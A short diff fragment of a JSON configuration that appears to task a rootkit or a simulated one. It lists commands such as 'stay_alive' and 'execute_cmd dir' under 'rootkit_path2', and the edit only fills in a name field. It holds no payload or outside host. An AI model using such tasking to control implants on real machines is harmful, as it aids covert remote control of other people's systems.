@@ -4,7 +4,7 @@
 		"command1":"stay_alive",
 		"command2":"execute_cmd dir",
 		"command3":""},
-	"name":""},
+	"name":"CorepPreprod2"},
 "rootkit_path2":{
 	"commands":{
 		"command1":"",
